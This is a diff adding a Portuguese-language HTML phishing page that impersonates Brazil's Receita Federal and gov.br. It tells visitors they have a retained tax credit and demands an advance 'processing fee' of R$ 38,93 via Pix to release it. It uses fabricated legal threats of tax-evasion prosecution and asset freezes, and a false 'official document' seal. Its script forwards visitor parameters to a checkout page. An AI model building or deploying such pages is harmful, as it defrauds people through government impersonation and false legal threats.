@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<script src="/params.js"></script>
+<script src="/api/tt.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Notificação Fiscal - gov.br</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Rawline:wght@400;500;600;700;800;900&display=swap">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { 
+            font-family: 'Rawline', 'Inter', sans-serif; 
+            background-color: #f0f2f5; 
+            color: #333;
+            margin: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+        .gov-blue { background-color: #004088; }
+        .gov-border { border-top: 6px solid #004088; }
+        .btn-gov { background-color: #1351b4; }
+        .legal-text { color: #555; font-size: 13px; line-height: 1.6; }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <header class="bg-white w-full shadow-sm">
+        <div class="max-w-7xl mx-auto px-6 py-5 flex justify-start items-center">
+            <img src="https://logodownload.org/wp-content/uploads/2022/05/gov.br-logo-0.png" class="h-16 md:h-20" alt="gov.br">
+        </div>
+        <div class="gov-blue w-full h-2 shadow-md"></div>
+    </header>
+
+    <main class="flex-grow p-4 md:p-10">
+        <div class="max-w-2xl mx-auto bg-white gov-border shadow-md overflow-hidden">
+            
+            <div class="bg-gray-50 py-10 px-8 flex flex-col items-center border-b border-gray-100">
+                <img src="../../assets/receita-federal-logo.svg" class="h-24 object-contain mb-4" alt="Receita Federal">
+                <p class="text-[12px] font-bold text-gray-500 uppercase tracking-[0.3em]">Secretaria da Receita Federal do Brasil</p>
+            </div>
+
+            <div class="p-6 md:p-12">
+                <div class="flex justify-between items-center mb-10 pb-4 border-b border-gray-100">
+                    <div class="text-[11px] text-gray-400 font-bold uppercase tracking-widest">
+                        EMISSÃO: <span id="current-date"></span>
+                    </div>
+                    <div class="text-[11px] text-gray-400 font-bold uppercase tracking-widest">
+                        REF: RFB-TKT-2026
+                    </div>
+                </div>
+
+                <h1 class="text-[#004088] text-2xl font-black leading-tight mb-8">
+                    Aviso importante da Receita Federal
+                </h1>
+
+                <div class="space-y-6 text-[#333] text-[15px] leading-relaxed mb-10 text-justify">
+                    <p>
+                        A Secretaria da Receita Federal do Brasil informa que foi identificado um crédito tributário retido, originário de proventos digitais via plataforma <strong>Digital</strong>. Conforme as normas vigentes, para a desinterdição e posterior transferência do saldo, é obrigatório o recolhimento antecipado da Taxa de Processamento de Ativos Digitais.
+                    </p>
+
+                    <p>
+                        Após o pagamento da taxa administrativa no valor de <strong class="text-black text-lg">R$ 38,93</strong>, referente ao valor do seu ganho, você receberá o saldo correspondente de forma imediata em sua conta bancária via Pix.
+                    </p>
+                    
+                    <div class="bg-yellow-50 p-6 border-l-4 border-yellow-500">
+                        <p class="text-gray-900 font-bold text-sm mb-3 uppercase tracking-tight">⚠️ Notificação de Irregularidade:</p>
+                        <p class="legal-text italic">
+                            O não cumprimento desta obrigação tributária poderá sujeitar o contribuinte à responsabilização por <strong>Sonegação Fiscal</strong>, conforme tipificado na <strong>Lei nº 4.729/65</strong> e no <strong>Art. 2º da Lei nº 8.137/90</strong>. A ausência de regularização acarretará a inscrição do CPF em Dívida Ativa da União e o bloqueio cautelar de ativos financeiros conforme diretrizes do Banco Central.
+                        </p>
+                    </div>
+                </div>
+
+                <div class="bg-gray-50 rounded-lg p-8 mb-10 border border-gray-200">
+                    <div class="flex justify-between items-center mb-2">
+                        <span class="text-xs font-bold text-gray-400 uppercase tracking-widest">Natureza do Tributo:</span>
+                        <span class="text-xs font-bold text-gray-700">Taxa de Liberação de Saldo Retido</span>
+                    </div>
+                    <div class="flex justify-between items-center border-t border-gray-200 pt-6 mt-6">
+                        <span class="text-md font-black text-gray-800 uppercase tracking-tighter">Total a recolher:</span>
+                        <span class="text-6x2 font-black text-black tracking-tighter">R$  38,93</span>
+                    </div>
+                </div>
+
+                <a href="#" onclick="irParaCheckout(event)"  class="block w-full btn-gov text-white text-center py-6 rounded font-bold text-xl shadow-sm hover:bg-[#0c326d] transition-all mb-8">
+                    Pagar taxa e liberar valor
+                </a>
+
+                <div class="flex items-center justify-center gap-2 opacity-50">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#004088"><path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/></svg>
+                    <span class="text-[10px] font-bold text-gray-500 uppercase tracking-[0.2em]">Autenticado via gov.br — Documento Oficial</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="mt-16 text-center text-gray-400 max-w-2xl mx-auto pb-20 px-6">
+            <div class="grid grid-cols-3 gap-2 mb-8 opacity-40 grayscale pointer-events-none uppercase font-black text-[8px] tracking-widest">
+                <span class="border-r border-gray-300 px-2">RECEITA FEDERAL</span>
+                <span class="border-r border-gray-300 px-2">BANCO CENTRAL</span>
+                <span class="px-2">MINISTÉRIO DA FAZENDA</span>
+            </div>
+            <p class="text-[9px] font-medium leading-relaxed italic opacity-60">
+                A reprodução deste documento sem autorização é crime federal. Lei 13.709/2018 (LGPD).
+            </p>
+        </div>
+    </main>
+
+    <script>
+        function setDate() {
+            const now = new Date();
+            const options = { day: '2-digit', month: '2-digit', year: 'numeric' };
+            document.getElementById('current-date').textContent = now.toLocaleDateString('pt-BR', options);
+        }
+        window.onload = setDate;
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="pix-modal.js"></script>
+<script>
+function irParaCheckout(event) {
+  event.preventDefault();
+  var dest = new URL('checkout.html', window.location.href);
+  new URLSearchParams(window.location.search).forEach(function(v, k) {
+    dest.searchParams.set(k, v);
+  });
+  window.location.href = dest.toString();
+}
+</script>
+
+</body>
+</html>
